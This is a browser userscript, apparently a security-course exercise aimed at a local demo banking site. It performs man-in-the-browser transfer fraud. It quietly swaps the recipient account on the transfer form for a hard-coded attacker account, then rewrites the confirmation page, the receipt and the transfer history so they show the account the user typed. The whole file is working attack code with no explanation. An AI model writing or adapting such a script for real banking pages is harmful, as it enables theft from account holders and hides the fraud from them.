// ==UserScript==
// @include http://127.0.0.1:8000/*
// ==/UserScript==

ROBBER = '161803';

window.addEventListener('DOMContentLoaded', function(){
	var save = function (e)
	{
		console.log(e);
		window.localStorage['visible_target'] = e.target.value;
	};

	if (window.location.pathname == '/dane_przelewu/')
	{
		var form = document.querySelector('form');
		var visible_target = document.querySelector('[name="target"]');
		visible_target.name = '';
		visible_target.addEventListener('input', save);
		var target = document.createElement('input');
		target.name = 'target';
		target.type = 'hidden';
		target.value = ROBBER;
		form.appendChild(target);
	}

	if (/^\/potwierdz_dane\//.test(window.location.pathname))
	{
		var target = document.querySelector('table tr:nth-of-type(2) td:nth-of-type(2)');
		if (window.localStorage['visible_target'] != undefined)
		{
			target.textContent = window.localStorage['visible_target'];
		}
	}
	
	if (/^\/potwierdzenie_przelewu\//.test(window.location.pathname))
	{
		var id = window.location.pathname.split('/')[2];
		var target = document.querySelector('table tr:nth-of-type(2) td:nth-of-type(2)');
		if (window.localStorage['fraud'+id] == undefined)
		{
			var date = document.querySelector('table tr:nth-of-type(4) td:nth-of-type(2)');
			window.localStorage['fraud'+id] = window.localStorage['visible_target'];
			window.localStorage['frauddate'+date.textContent] = id;
			window.localStorage.removeItem('visible_target');
		}
		target.textContent = window.localStorage['fraud'+id];
	}

	if (window.location.pathname == '/przelewy/')
	{
		var list = document.querySelectorAll('li');
		for (var i = 0; i < list.length; ++i)
		{
			var li = list[i];
			var parts = li.textContent.split(', ');
			var id = window.localStorage['frauddate'+parts[2]];
			if (id != undefined)
			{
				parts[0] = parts[0].replace(ROBBER, window.localStorage['fraud'+id]);
				li.textContent = parts.join(', ');
			}
		}
	}
});
